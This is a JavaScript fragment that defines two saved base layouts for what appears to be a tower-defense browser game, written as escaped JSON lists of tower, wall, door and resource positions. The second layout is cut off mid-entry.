let axeBase = "{\"86628687\":{\"x\":0,\"y\":-96,\"type\":\"BombTower\"},\"86628690\":{\"x\":-96,\"y\":-96,\"type\":\"BombTower\"},\"86628694\":{\"x\":96,\"y\":-96,\"type\":\"BombTower\"},\"86628717\":{\"x\":-96,\"y\":96,\"type\":\"BombTower\"},\"86628718\":{\"x\":0,\"y\":96,\"type\":\"BombTower\"},\"86628720\":{\"x\":96,\"y\":96,\"type\":\"BombTower\"},\"86628742\":{\"x\":-48,\"y\":192,\"type\":\"BombTower\"},\"86628745\":{\"x\":48,\"y\":192,\"type\":\"BombTower\"},\"86628759\":{\"x\":48,\"y\":288,\"type\":\"BombTower\"},\"86628763\":{\"x\":-48,\"y\":288,\"type\":\"BombTower\"},\"86628767\":{\"x\":48,\"y\":384,\"type\":\"BombTower\"},\"86628791\":{\"x\":-192,\"y\":96,\"type\":\"ArrowTower\"},\"86628796\":{\"x\":-144,\"y\":192,\"type\":\"ArrowTower\"},\"86628797\":{\"x\":-144,\"y\":288,\"type\":\"ArrowTower\"},\"86628801\":{\"x\":-144,\"y\":384,\"type\":\"ArrowTower\"},\"86628803\":{\"x\":-48,\"y\":384,\"type\":\"ArrowTower\"},\"86628821\":{\"x\":-240,\"y\":288,\"type\":\"ArrowTower\"},\"86628838\":{\"x\":-288,\"y\":96,\"type\":\"CannonTower\"},\"86628842\":{\"x\":-336,\"y\":192,\"type\":\"CannonTower\"},\"86628844\":{\"x\":-240,\"y\":192,\"type\":\"CannonTower\"},\"86628854\":{\"x\":-336,\"y\":288,\"type\":\"CannonTower\"},\"86628872\":{\"x\":-240,\"y\":384,\"type\":\"CannonTower\"},\"86628876\":{\"x\":-336,\"y\":384,\"type\":\"ArrowTower\"},\"86628896\":{\"x\":-384,\"y\":96,\"type\":\"MagicTower\"},\"86628908\":{\"x\":-432,\"y\":192,\"type\":\"MagicTower\"},\"86628911\":{\"x\":-432,\"y\":288,\"type\":\"MagicTower\"},\"86628929\":{\"x\":-288,\"y\":480,\"type\":\"MagicTower\"},\"86628950\":{\"x\":-192,\"y\":576,\"type\":\"MagicTower\"},\"86628955\":{\"x\":-96,\"y\":576,\"type\":\"MagicTower\"},\"86628959\":{\"x\":0,\"y\":576,\"type\":\"CannonTower\"},\"86628966\":{\"x\":96,\"y\":576,\"type\":\"MagicTower\"},\"86628975\":{\"x\":192,\"y\":576,\"type\":\"MagicTower\"},\"86629090\":{\"x\":288,\"y\":480,\"type\":\"MagicTower\"},\"86630007\":{\"x\":336,\"y\":384,\"type\":\"ArrowTower\"},\"86632398\":{\"x\":432,\"y\":288,\"type\":\"MagicTower\"},\"86632802\":{\"x\":432,\"y\":192,\"type\":\"MagicTower\"},\"86634550\":{\"x\":384,\"y\":96,\"type\":\"MagicTower\"},\"86635003\":{\"x\":384,\"y\":-96,\"type\":\"MagicTower\"},\"86635449\":{\"x\":432,\"y\":-192,\"type\":\"MagicTower\"},\"86638239\":{\"x\":432,\"y\":-288,\"type\":\"MagicTower\"},\"86640532\":{\"x\":504,\"y\":-264,\"type\":\"Wall\"},\"86640763\":{\"x\":504,\"y\":-216,\"type\":\"Wall\"},\"86641165\":{\"x\":552,\"y\":-264,\"type\":\"Door\"},\"86641368\":{\"x\":552,\"y\":-216,\"type\":\"Door\"},\"86641766\":{\"x\":504,\"y\":-312,\"type\":\"Door\"},\"86642135\":{\"x\":504,\"y\":-168,\"type\":\"Door\"},\"86642532\":{\"x\":456,\"y\":-120,\"type\":\"Door\"},\"86644512\":{\"x\":456,\"y\":-72,\"type\":\"Door\"},\"86645119\":{\"x\":504,\"y\":-24,\"type\":\"Door\"},\"86645838\":{\"x\":504,\"y\":72,\"type\":\"Door\"},\"86646195\":{\"x\":456,\"y\":72,\"type\":\"Wall\"},\"86646538\":{\"x\":456,\"y\":120,\"type\":\"Door\"},\"86648681\":{\"x\":504,\"y\":264,\"type\":\"Wall\"},\"86648947\":{\"x\":504,\"y\":216,\"type\":\"Door\"},\"86649194\":{\"x\":552,\"y\":264,\"type\":\"Door\"},\"86649362\":{\"x\":504,\"y\":312,\"type\":\"Door\"},\"86650981\":{\"x\":408,\"y\":360,\"type\":\"Wall\"},\"86651151\":{\"x\":456,\"y\":360,\"type\":\"Door\"},\"86651293\":{\"x\":408,\"y\":408,\"type\":\"Door\"},\"86652331\":{\"x\":360,\"y\":456,\"type\":\"Door\"},\"86652420\":{\"x\":360,\"y\":504,\"type\":\"Door\"},\"86652621\":{\"x\":264,\"y\":552,\"type\":\"Wall\"},\"86652763\":{\"x\":312,\"y\":552,\"type\":\"Door\"},\"86653960\":{\"x\":264,\"y\":600,\"type\":\"Door\"},\"86655294\":{\"x\":-168,\"y\":648,\"type\":\"Wall\"},\"86655311\":{\"x\":-120,\"y\":648,\"type\":\"Wall\"},\"86655318\":{\"x\":-72,\"y\":648,\"type\":\"Wall\"},\"86655319\":{\"x\":-24,\"y\":648,\"type\":\"Wall\"},\"86655356\":{\"x\":24,\"y\":648,\"type\":\"Wall\"},\"86655451\":{\"x\":168,\"y\":648,\"type\":\"Wall\"},\"86655604\":{\"x\":120,\"y\":648,\"type\":\"Wall\"},\"86655625\":{\"x\":72,\"y\":648,\"type\":\"Wall\"},\"86657347\":{\"x\":-264,\"y\":552,\"type\":\"Wall\"},\"86657523\":{\"x\":-312,\"y\":552,\"type\":\"Door\"},\"86657650\":{\"x\":-264,\"y\":600,\"type\":\"Door\"},\"86657818\":{\"x\":-360,\"y\":456,\"type\":\"Door\"},\"86657935\":{\"x\":-360,\"y\":504,\"type\":\"Door\"},\"86658330\":{\"x\":-408,\"y\":360,\"type\":\"Wall\"},\"86658466\":{\"x\":-456,\"y\":360,\"type\":\"Door\"},\"86658582\":{\"x\":-408,\"y\":408,\"type\":\"Door\"},\"86659619\":{\"x\":-504,\"y\":264,\"type\":\"Wall\"},\"86659824\":{\"x\":-504,\"y\":216,\"type\":\"Door\"},\"86660042\":{\"x\":-552,\"y\":264,\"type\":\"Door\"},\"86660411\":{\"x\":-504,\"y\":312,\"type\":\"Door\"},\"86661147\":{\"x\":-456,\"y\":120,\"type\":\"Door\"},\"86663311\":{\"x\":-456,\"y\":72,\"type\":\"Door\"},\"86663362\":{\"x\":-504,\"y\":24,\"type\":\"Door\"},\"86663643\":{\"x\":-456,\"y\":-72,\"type\":\"Wall\"},\"86663701\":{\"x\":-456,\"y\":-120,\"type\":\"Door\"},\"86663744\":{\"x\":-504,\"y\":-72,\"type\":\"Door\"},\"86664402\":{\"x\":-432,\"y\":0,\"type\":\"Harvester\"},\"86664415\":{\"x\":-336,\"y\":0,\"type\":\"Harvester\"},\"86664417\":{\"x\":-240,\"y\":0,\"type\":\"Harvester\"},\"86664419\":{\"x\":-144,\"y\":0,\"type\":\"Harvester\"},\"86664516\":{\"x\":-192,\"y\":480,\"type\":\"CannonTower\"},\"86664519\":{\"x\":-96,\"y\":480,\"type\":\"CannonTower\"},\"86664536\":{\"x\":0,\"y\":480,\"type\":\"ArrowTower\"},\"86664537\":{\"x\":96,\"y\":480,\"type\":\"ArrowTower\"},\"86664538\":{\"x\":192,\"y\":480,\"type\":\"ArrowTower\"},\"86664583\":{\"x\":240,\"y\":384,\"type\":\"ArrowTower\"},\"86664600\":{\"x\":336,\"y\":288,\"type\":\"ArrowTower\"},\"86664606\":{\"x\":336,\"y\":192,\"type\":\"ArrowTower\"},\"86664611\":{\"x\":240,\"y\":192,\"type\":\"ArrowTower\"},\"86664615\":{\"x\":240,\"y\":288,\"type\":\"ArrowTower\"},\"86664670\":{\"x\":144,\"y\":192,\"type\":\"GoldMine\"},\"86664672\":{\"x\":144,\"y\":288,\"type\":\"GoldMine\"},\"86664673\":{\"x\":144,\"y\":384,\"type\":\"GoldMine\"},\"86664678\":{\"x\":192,\"y\":96,\"type\":\"ArrowTower\"},\"86664698\":{\"x\":288,\"y\":96,\"type\":\"CannonTower\"},\"86664705\":{\"x\":288,\"y\":-96,\"type\":\"CannonTower\"},\"86664770\":{\"x\":192,\"y\":-96,\"type\":\"ArrowTower\"},\"86664776\":{\"x\":336,\"y\":-192,\"type\":\"ArrowTower\"},\"86664781\":{\"x\":336,\"y\":-288,\"type\":\"ArrowTower\"},\"86664785\":{\"x\":240,\"y\":-192,\"type\":\"ArrowTower\"},\"86664888\":{\"x\":72,\"y\":-24,\"type\":\"Door\"},\"86664906\":{\"x\":-72,\"y\":24,\"type\":\"Door\"},\"86664911\":{\"x\":-72,\"y\":-24,\"type\":\"SlowTrap\"},\"86664924\":{\"x\":72,\"y\":24,\"type\":\"SlowTrap\"},\"86665279\":{\"x\":144,\"y\":0,\"type\":\"Harvester\"},\"86665288\":{\"x\":240,\"y\":0,\"type\":\"Harvester\"},\"86665299\":{\"x\":336,\"y\":0,\"type\":\"Harvester\"},\"86666429\":{\"x\":432,\"y\":0,\"type\":\"Harvester\"},\"86675615\":{\"x\":408,\"y\":-360,\"type\":\"Wall\"},\"86675868\":{\"x\":408,\"y\":-408,\"type\":\"Door\"},\"86676145\":{\"x\":456,\"y\":-360,\"type\":\"Door\"},\"86680116\":{\"x\":336,\"y\":-384,\"type\":\"MagicTower\"},\"86680529\":{\"x\":288,\"y\":-480,\"type\":\"MagicTower\"},\"86683036\":{\"x\":192,\"y\":-576,\"type\":\"MagicTower\"},\"86683707\":{\"x\":192,\"y\":-480,\"type\":\"ArrowTower\"},\"86686184\":{\"x\":240,\"y\":-384,\"type\":\"GoldMine\"},\"86686327\":{\"x\":144,\"y\":-384,\"type\":\"GoldMine\"},\"86686416\":{\"x\":144,\"y\":-288,\"type\":\"GoldMine\"},\"86686450\":{\"x\":144,\"y\":-192,\"type\":\"GoldMine\"},\"86687865\":{\"x\":240,\"y\":-288,\"type\":\"GoldMine\"},\"86690461\":{\"x\":360,\"y\":-456,\"type\":\"Door\"},\"86690604\":{\"x\":360,\"y\":-504,\"type\":\"Door\"},\"86691471\":{\"x\":264,\"y\":-552,\"type\":\"Wall\"},\"86691629\":{\"x\":264,\"y\":-600,\"type\":\"Door\"},\"86691794\":{\"x\":312,\"y\":-552,\"type\":\"Door\"},\"86693174\":{\"x\":96,\"y\":-576,\"type\":\"CannonTower\"},\"86693251\":{\"x\":0,\"y\":-576,\"type\":\"CannonTower\"},\"86693351\":{\"x\":-96,\"y\":-576,\"type\":\"CannonTower\"},\"86694165\":{\"x\":-96,\"y\":-480,\"type\":\"CannonTower\"},\"86694205\":{\"x\":0,\"y\":-480,\"type\":\"CannonTower\"},\"86694241\":{\"x\":96,\"y\":-480,\"type\":\"CannonTower\"},\"86694463\":{\"x\":-192,\"y\":-480,\"type\":\"CannonTower\"},\"86695546\":{\"x\":-192,\"y\":-576,\"type\":\"MagicTower\"},\"86696889\":{\"x\":-288,\"y\":-480,\"type\":\"MagicTower\"},\"86697029\":{\"x\":-336,\"y\":-384,\"type\":\"MagicTower\"},\"86698641\":{\"x\":-432,\"y\":-288,\"type\":\"MagicTower\"},\"86698792\":{\"x\":-432,\"y\":-192,\"type\":\"MagicTower\"},\"86699751\":{\"x\":-384,\"y\":-96,\"type\":\"MagicTower\"},\"86699974\":{\"x\":-288,\"y\":-96,\"type\":\"CannonTower\"},\"86700732\":{\"x\":-240,\"y\":-192,\"type\":\"CannonTower\"},\"86700814\":{\"x\":-336,\"y\":-192,\"type\":\"CannonTower\"},\"86700999\":{\"x\":-336,\"y\":-288,\"type\":\"CannonTower\"},\"86701089\":{\"x\":-240,\"y\":-288,\"type\":\"CannonTower\"},\"86701675\":{\"x\":-144,\"y\":-192,\"type\":\"ArrowTower\"},\"86701742\":{\"x\":-192,\"y\":-96,\"type\":\"ArrowTower\"},\"86702684\":{\"x\":-240,\"y\":-384,\"type\":\"CannonTower\"},\"86702747\":{\"x\":-144,\"y\":-384,\"type\":\"CannonTower\"},\"86702977\":{\"x\":-144,\"y\":-288,\"type\":\"BombTower\"},\"86702988\":{\"x\":-48,\"y\":-288,\"type\":\"BombTower\"},\"86702996\":{\"x\":48,\"y\":-288,\"type\":\"BombTower\"},\"86703081\":{\"x\":-48,\"y\":-384,\"type\":\"BombTower\"},\"86703095\":{\"x\":48,\"y\":-384,\"type\":\"BombTower\"},\"86703165\":{\"x\":-48,\"y\":-192,\"type\":\"BombTower\"},\"86703184\":{\"x\":48,\"y\":-192,\"type\":\"BombTower\"},\"86703593\":{\"x\":168,\"y\":-648,\"type\":\"Wall\"},\"86703596\":{\"x\":120,\"y\":-648,\"type\":\"Wall\"},\"86703599\":{\"x\":72,\"y\":-648,\"type\":\"Wall\"},\"86703600\":{\"x\":24,\"y\":-648,\"type\":\"Wall\"},\"86703605\":{\"x\":-24,\"y\":-648,\"type\":\"Wall\"},\"86703606\":{\"x\":-72,\"y\":-648,\"type\":\"Wall\"},\"86703615\":{\"x\":-120,\"y\":-648,\"type\":\"Wall\"},\"86703852\":{\"x\":-168,\"y\":-648,\"type\":\"Wall\"},\"86703862\":{\"x\":-264,\"y\":-600,\"type\":\"Door\"},\"86703871\":{\"x\":-264,\"y\":-552,\"type\":\"Wall\"},\"86703878\":{\"x\":-312,\"y\":-552,\"type\":\"Door\"},\"86703882\":{\"x\":-360,\"y\":-504,\"type\":\"Door\"},\"86703885\":{\"x\":-360,\"y\":-456,\"type\":\"Door\"},\"86703893\":{\"x\":-408,\"y\":-360,\"type\":\"Wall\"},\"86703896\":{\"x\":-408,\"y\":-408,\"type\":\"Door\"},\"86703900\":{\"x\":-456,\"y\":-360,\"type\":\"Door\"},\"86703941\":{\"x\":-504,\"y\":-264,\"type\":\"Wall\"},\"86703946\":{\"x\":-504,\"y\":-312,\"type\":\"Door\"},\"86703951\":{\"x\":-552,\"y\":-264,\"type\":\"Door\"},\"86703954\":{\"x\":-504,\"y\":-216,\"type\":\"Door\"}}";
let newPlusBase = "{\"31464096\":{\"x\":-72,\"y\":-120,\"type\":\"Door\"},\"31464097\":{\"x\":-24,\"y\":-120,\"type\":\"Door\"},\"31464098\":{\"x\":-24,\"y\":-72,\"type\":\"Door\"},\"31464099\":{\"x\":-72,\"y\":-72,\"type\":\"Door\"},\"31464100\":{\"x\":72,\"y\":-72,\"type\":\"Door\"},\"31464101\":{\"x\":120,\"y\":-72,\"type\":\"Door\"},\"31464102\":{\"x\":120,\"y\":-24,\"type\":\"Door\"},\"31464103\":{\"x\":72,\"y\":-24,\"type\":\"Door\"},\"31464104\":{\"x\":24,\"y\":72,\"type\":\"Door\"},\"31464105\":{\"x\":72,\"y\":72,\"type\":\"Door\"},\"31464106\":{\"x\":72,\"y\":120,\"type\":\"Door\"},\"31464107\":{\"x\":24,\"y\":120,\"type\":\"Door\"},\"31464108\":{\"x\":-120,\"y\":24,\"type\":\"Door\"},\"31464109\":{\"x\":-72,\"y\":24,\"type\":\"Door\"},\"31464110\":{\"x\":-72,\"y\":72,\"type\":\"Door\"},\"31464111\":{\"x\":-120,\"y\":72,\"type\":\"Door\"},\"31464112\":{\"x\":-120,\"y\":-24,\"type\":\"SlowTrap\"},\"31464113\":{\"x\":-72,\"y\":-24,\"type\":\"SlowTrap\"},\"31464114\":{\"x\":24,\"y\":-120,\"type\":\"SlowTrap\"},\"31464115\":{\"x\":24,\"y\":-72,\"type\":\"SlowTrap\"},\"31464116\":{\"x\":72,\"y\":24,\"type\":\"SlowTrap\"},\"31464117\":{\"x\":120,\"y\":24,\"type\":\"SlowTrap\"},\"31464118\":{\"x\":-24,\"y\":72,\"type\":\"SlowTrap\"},\"31464119\":{\"x\":-24,\"y\":120,\"type\":\"SlowTrap\"},\"31464120\":{\"x\":-144,\"y\":-96,\"type\":\"GoldMine\"},\"31464121\":{\"x\":-96,\"y\":-192,\"type\":\"GoldMine\"},\"31464122\":{\"x\":96,\"y\":-144,\"type\":\"GoldMine\"},\"31464123\":{\"x\":192,\"y\":-96,\"type\":\"GoldMine\"},\"31464124\":{\"x\":144,\"y\":96,\"type\":\"GoldMine\"},\"31464126\":{\"x\":-96,\"y\":144,\"type\":\"GoldMine\"},\"31464127\":{\"x\":-192,\"y\":96,\"type\":\"GoldMine\"},\"31464128\":{\"x\":192,\"y\":192,\"type\":\"GoldMine\"},\"31464129\":{\"x\":0,\"y\":-192,\"type\":\"Harvester\"},\"31464130\":{\"x\":-192,\"y\":0,\"type\":\"Harvester\"},\"31464132\":{\"x\":0,\"y\":192,\"type\":\"Harvester\"},\"31464133\":{\"x\":-192,\"y\":192,\"type\":\"BombTower\"},\"31464134\":{\"x\":-96,\"y\":240,\"type\":\"BombTower\"},\"31464136\":{\"x\":-192,\"y\":288,\"type\":\"BombTower\"},\"31464776\":{\"x\":-288,\"y\":144,\"type\":\"ArrowTower\"},\"31464800\":{\"x\":-336,\"y\":240,\"type\":\"ArrowTower\"},\"31464825\":{\"x\":-384,\"y\":144,\"type\":\"CannonTower\"},\"31464837\":{\"x\":-432,\"y\":240,\"type\":\"CannonTower\"},\"31464917\":{\"x\":-336,\"y\":48,\"type\":\"CannonTower\"},\"31464930\":{\"x\":-432,\"y\":48,\"type\":\"CannonTower\"},\"31464946\":{\"x\":-264,\"y\":24,\"type\":\"Wall\"},\"31464953\":{\"x\":-264,\"y\":72,\"type\":\"Wall\"},\"31464980\":{\"x\":-528,\"y\":48,\"type\":\"MagicTower\"},\"31464993\":{\"x\":-480,\"y\":144,\"type\":\"MagicTower\"},\"31464998\":{\"x\":-528,\"y\":240,\"type\":\"MagicTower\"},\"31465007\":{\"x\":-600,\"y\":24,\"type\":\"Wall\"},\"31465014\":{\"x\":-648,\"y\":24,\"type\":\"Door\"},\"31465019\":{\"x\":-600,\"y\":72,\"type\":\"Door\"},\"31465022\":{\"x\":-552,\"y\":120,\"type\":\"Door\"},\"31465025\":{\"x\":-552,\"y\":168,\"type\":\"Door\"},\"31465049\":{\"x\":-600,\"y\":216,\"type\":\"SlowTrap\"},\"31465052\":{\"x\":-648,\"y\":264,\"type\":\"SlowTrap\"},\"31465060\":{\"x\":-600,\"y\":264,\"type\":\"Wall\"},\"31465080\":{\"x\":-576,\"y\":-48,\"type\":\"Harvester\"},\"31465081\":{\"x\":-648,\"y\":-72,\"type\":\"Door\"},\"31465082\":{\"x\":-600,\"y\":-120,\"type\":\"Door\"},\"31465083\":{\"x\":-648,\"y\":-24,\"type\":\"SlowTrap\"},\"31465084\":{\"x\":-504,\"y\":-24,\"type\":\"SlowTrap\"},\"31465085\":{\"x\":-456,\"y\":-24,\"type\":\"SlowTrap\"},\"31465086\":{\"x\":-408,\"y\":-24,\"type\":\"SlowTrap\"},\"31465087\":{\"x\":-360,\"y\":-24,\"type\":\"SlowTrap\"},\"31465088\":{\"x\":-312,\"y\":-24,\"type\":\"SlowTrap\"},\"31465089\":{\"x\":-264,\"y\":-24,\"type\":\"SlowTrap\"},\"31465090\":{\"x\":-552,\"y\":-120,\"type\":\"Wall\"},\"31465091\":{\"x\":-552,\"y\":-168,\"type\":\"Door\"},\"31465092\":{\"x\":-552,\"y\":-216,\"type\":\"Door\"},\"31465093\":{\"x\":-480,\"y\":-96,\"type\":\"MagicTower\"},\"31465094\":{\"x\":-480,\"y\":-192,\"type\":\"MagicTower\"},\"31465095\":{\"x\":-384,\"y\":-192,\"type\":\"CannonTower\"},\"31465096\":{\"x\":-384,\"y\":-96,\"type\":\"CannonTower\"},\"31465097\":{\"x\":-288,\"y\":-192,\"type\":\"ArrowTower\"},\"31465098\":{\"x\":-288,\"y\":-96,\"type\":\"ArrowTower\"},\"31465099\":{\"x\":-192,\"y\":-192,\"type\":\"ArrowTower\"},\"31465100\":{\"x\":-216,\"y\":-120,\"type\":\"Wall\"},\"31465101\":{\"x\":-216,\"y\":-72,\"type\":\"Wall\"},\"31465102\":{\"x\":-600,\"y\":-264,\"type\":\"Door\"},\"31465103\":{\"x\":-600,\"y\":-312,\"type\":\"Door\"},\"31465104\":{\"x\":-648,\"y\":-360,\"type\":\"Door\"},\"31465105\":{\"x\":-648,\"y\":-408,\"type\":\"Door\"},\"31465106\":{\"x\":-528,\"y\":-288,\"type\":\"MagicTower\"},\"31465107\":{\"x\":-528,\"y\":-384,\"type\":\"ArrowTower\"},\"31465108\":{\"x\":-600,\"y\":-408,\"type\":\"Wall\"},\"31465109\":{\"x\":-600,\"y\":-360,\"type\":\"Wall\"},\"31465110\":{\"x\":-552,\"y\":-456,\"type\":\"Wall\"},\"31465111\":{\"x\":-504,\"y\":-456,\"type\":\"Wall\"},\"31465112\":{\"x\":-504,\"y\":-504,\"type\":\"Wall\"},\"31465113\":{\"x\":-456,\"y\":-552,\"type\":\"Wall\"},\"31465114\":{\"x\":-408,\"y\":-552,\"type\":\"Wall\"},\"31465115\":{\"x\":-408,\"y\":-600,\"type\":\"Wall\"},\"31465116\":{\"x\":-360,\"y\":-648,\"type\":\"Wall\"},\"31465117\":{\"x\":-312,\"y\":-648,\"type\":\"Wall\"},\"31465118\":{\"x\":-336,\"y\":-576,\"type\":\"ArrowTower\"},\"31465119\":{\"x\":-336,\"y\":-480,\"type\":\"CannonTower\"},\"31465120\":{\"x\":-432,\"y\":-384,\"type\":\"CannonTower\"},\"31465121\":{\"x\":-432,\"y\":-288,\"type\":\"CannonTower\"},\"31465122\":{\"x\":-240,\"y\":-480,\"type\":\"CannonTower\"},\"31465123\":{\"x\":-144,\"y\":-432,\"type\":\"CannonTower\"},\"31465124\":{\"x\":-48,\"y\":-384,\"type\":\"CannonTower\"},\"31465125\":{\"x\":-240,\"y\":-576,\"type\":\"MagicTower\"},\"31465126\":{\"x\":-144,\"y\":-528,\"type\":\"MagicTower\"},\"31465127\":{\"x\":-48,\"y\":-480,\"type\":\"MagicTower\"},\"31465128\":{\"x\":-240,\"y\":-384,\"type\":\"ArrowTower\"},\"31465129\":{\"x\":-144,\"y\":-336,\"type\":\"ArrowTower\"},\"31465130\":{\"x\":-48,\"y\":-288,\"type\":\"ArrowTower\"},\"31465131\":{\"x\":-120,\"y\":-264,\"type\":\"Wall\"},\"31465132\":{\"x\":-168,\"y\":-264,\"type\":\"Wall\"},\"31465133\":{\"x\":-432,\"y\":-480,\"type\":\"BombTower\"},\"31465134\":{\"x\":-336,\"y\":-384,\"type\":\"BombTower\"},\"31465136\":{\"x\":-240,\"y\":-288,\"type\":\"BombTower\"},\"31465137\":{\"x\":-336,\"y\":-288,\"type\":\"ArrowTower\"},\"31465138\":{\"x\":-312,\"y\":-696,\"type\":\"Door\"},\"31465139\":{\"x\":-360,\"y\":-696,\"type\":\"Door\"},\"31465140\":{\"x\":-408,\"y\":-648,\"type\":\"Door\"},\"31465141\":{\"x\":-456,\"y\":-600,\"type\":\"Door\"},\"31465142\":{\"x\":-504,\"y\":-552,\"type\":\"Door\"},\"31465143\":{\"x\":-552,\"y\":-504,\"type\":\"Door\"},\"31465144\":{\"x\":-600,\"y\":-456,\"type\":\"Door\"},\"31465145\":{\"x\":-264,\"y\":-648,\"type\":\"Door\"},\"31465146\":{\"x\":-216,\"y\":-648,\"type\":\"Door\"},\"31465147\":{\"x\":-168,\"y\":-600,\"type\":\"Door\"},\"31465148\":{\"x\":-120,\"y\":-600,\"type\":\"Door\"},\"31465152\":{\"x\":-72,\"y\":-600,\"type\":\"Door\"},\"31465153\":{\"x\":-24,\"y\":-648,\"type\":\"Door\"},\"31465154\":{\"x\":-72,\"y\":-552,\"type\":\"Wall\"},\"31465155\":{\"x\":0,\"y\":-576,\"type\":\"Harvester\"},\"31465156\":{\"x\":24,\"y\":-648,\"type\":\"SlowTrap\"},\"31465157\":{\"x\":72,\"y\":-600,\"type\":\"Wall\"},\"31465158\":{\"x\":72,\"y\":-648,\"type\":\"Door\"},\"31465159\":{\"x\":120,\"y\":-600,\"type\":\"Door\"},\"31465160\":{\"x\":96,\"y\":-528,\"type\":\"MagicTower\"},\"31465161\":{\"x\":192,\"y\":-480,\"type\":\"MagicTower\"},\"31465162\":{\"x\":288,\"y\":-528,\"type\":\"MagicTower\"},\"31465163\":{\"x\":384,\"y\":-576,\"type\":\"MagicTower\"},\"31465164\":{\"x\":168,\"y\":-552,\"type\":\"Door\"},\"31465165\":{\"x\":216,\"y\":-552,\"type\":\"Door\"},\"31465166\":{\"x\":312,\"y\":-600,\"type\":\"Wall\"},\"31465167\":{\"x\":360,\"y\":-648,\"type\":\"Wall\"},\"31465168\":{\"x\":408,\"y\":-648,\"type\":\"Wall\"},\"31465170\":{\"x\":264,\"y\":-600,\"type\":\"Door\"},\"31465171\":{\"x\":312,\"y\":-648,\"type\":\"Door\"},\"31465172\":{\"x\":360,\"y\":-696,\"type\":\"Door\"},\"31465173\":{\"x\":408,\"y\":-696,\"type\":\"Door\"},\"31465174\":{\"x\":456,\"y\":-648,\"type\":\"Door\"},\"31466967\":{\"x\":504,\"y\":-648,\"type\":\"Door\"},\"31467041\":{\"x\":552,\"y\":-600,\"type\":\"Door\"},\"31467357\":{\"x\":600,\"y\":-552,\"type\":\"Door\"},\"31467376\":{\"x\":648,\"y\":-504,\"type\":\"Door\"},\"31467398\":{\"x\":456,\"y\":-600,\"type\":\"Wall\"},\"31467400\":{\"x\":504,\"y\":-600,\"type\":\"Wall\"},\"31467423\":{\"x\":96,\"y\":-432,\"type\":\"CannonTower\"},\"31467424\":{\"x\":192,\"y\":-384,\"type\":\"CannonTower\"},\"31467425\":{\"x\":288,\"y\":-432,\"type\":\"CannonTower\"},\"31467426\":{\"x\":384,\"y\":-480,\"type\":\"CannonTower\"},\"31467427\":{\"x\":480,\"y\":-528,\"type\":\"CannonTower\"},\"31467428\":{\"x\":552,\"y\":-552,\"type\":\"Wall\"},\"31467429\":{\"x\":552,\"y\":-504,\"type\":\"Wall\"},\"31467430\":{\"x\":600,\"y\":-504,\"type\":\"Wall\"},\"31467431\":{\"x\":576,\"y\":-432,\"type\":\"MeleeTower\"},\"31467432\":{\"x\":576,\"y\":-336,\"type\":\"MeleeTower\"},\"31467433\":{\"x\":576,\"y\":-240,\"type\":\"MeleeTower\"},\"31467435\":{\"x\":648,\"y\":-360,\"type\":\"Wall\"},\"31467436\":{\"x\":648,\"y\":-312,\"type\":\"Wall\"},\"31467437\":{\"x\":648,\"y\":-264,\"type\":\"Wall\"},\"31467438\":{\"x\":648,\"y\":-216,\"type\":\"Wall\"},\"31467439\":{\"x\":696,\"y\":-312,\"type\":\"Wall\"},\"31467440\":{\"x\":696,\"y\":-264,\"type\":\"Wall\"},\"31467444\":{\"x\":648,\"y\":-408,\"type\":\"Door\"},\"31467454\":{\"x\":696,\"y\":-360,\"type\":\"Door\"},\"31467487\":{\"x\":744,\"y\":-312,\"type\":\"Door\"},\"31467488\":{\"x\":744,\"y\":-264,\"type\":\"Door\"},\"31467530\":{\"x\":696,\"y\":-216,\"type\":\"Door\"},\"31467531\":{\"x\":648,\"y\":-168,\"type\":\"Door\"},\"31467532\":{\"x\":648,\"y\":-456,\"type\":\"Door\"},\"31467533\":{\"x\":600,\"y\":-168,\"type\":\"Wall\"},\"31467534\":{\"x\":600,\"y\":-120,\"type\":\"Door\"},\"31467535\":{\"x\":600,\"y\":-72,\"type\":\"Door\"},\"31467536\":{\"x\":648,\"y\":-24,\"type\":\"Door\"},\"31467537\":{\"x\":552,\"y\":-72,\"type\":\"Wall\"},\"31467538\":{\"x\":576,\"y\":0,\"type\":\"Harvester\"},\"31467539\":{\"x\":600,\"y\":72,\"type\":\"Wall\"},\"31467540\":{\"x\":648,\"y\":72,\"type\":\"Door\"},\"31467541\":{\"x\":600,\"y\":120,\"type\":\"Door\"},\"31467542\":{\"x\":648,\"y\":24,\"type\":\"SlowTrap\"},\"31467543\":{\"x\":552,\"y\":168,\"type\":\"Wall\"},\"31467544\":{\"x\":600,\"y\":168,\"type\":\"Door\"},\"31467545\":{\"x\":600,\"y\":216,\"type\":\"Door\"},\"31467546\":{\"x\":552,\"y\":216,\"type\":\"Door\"},\"31467547\":{\"x\":528,\"y\":96,\"type\":\"MagicTower\"},\"31467548\":{\"x\":480,\"y\":192,\"type\":\"MagicTower\"},\"31467549\":{\"x\":528,\"y\":-144,\"type\":\"MagicTower\"},\"31467550\":{\"x\":480,\"y\":-48,\"type\":\"MagicTower\"},\"31467551\":{\"x\":504,\"y\":24,\"type\":\"SlowTrap\"},\"31467552\":{\"x\":456,\"y\":24,\"type\":\"SlowTrap\"},\"31467553\":{\"x\":408,\"y\":24,\"type\":\"SlowTrap\"},\"31467554\":{\"x\":360,\"y\":24,\"type\":\"SlowTrap\"},\"31467555\":{\"x\":312,\"y\":24,\"type\":\"SlowTrap\"},\"31467557\":{\"x\":192,\"y\":0,\"type\":\"Harvester\"},\"31467558\":{\"x\":264,\"y\":24,\"type\":\"SlowTrap\"},\"31467559\":{\"x\":432,\"y\":-144,\"type\":\"CannonTower\"},\"31467560\":{\"x\":384,\"y\":-48,\"type\":\"CannonTower\"},\"31467561\":{\"x\":336,\"y\":-144,\"type\":\"ArrowTower\"},\"31467564\":{\"x\":288,\"y\":-48,\"type\":\"BombTower\"},\"31467565\":{\"x\":264,\"y\":-168,\"type\":\"Wall\"},\"31467566\":{\"x\":264,\"y\":-120,\"type\":\"Wall\"},\"31467567\":{\"x\":192,\"y\":-288,\"type\":\"ArrowTower\"},\"31467568\":{\"x\":96,\"y\":-336,\"type\":\"ArrowTower\"},\"31467569\":{\"x\":96,\"y\":-240,\"type\":\"ArrowTower\"},\"31467570\":{\"x\":192,\"y\":-192,\"type\":\"BombTower\"},\"31467571\":{\"x\":288,\"y\":-336,\"type\":\"BombTower\"},\"31467572\":{\"x\":384,\"y\":-384,\"type\":\"BombTower\"},\"31467573\":{\"x\":288,\"y\":-240,\"type\":\"BombTower\"},\"31467574\":{\"x\":384,\"y\":-240,\"type\":\"BombTower\"},\"31467575\":{\"x\":480,\"y\":-240,\"type\":\"BombTower\"},\"31467576\":{\"x\":360,\"y\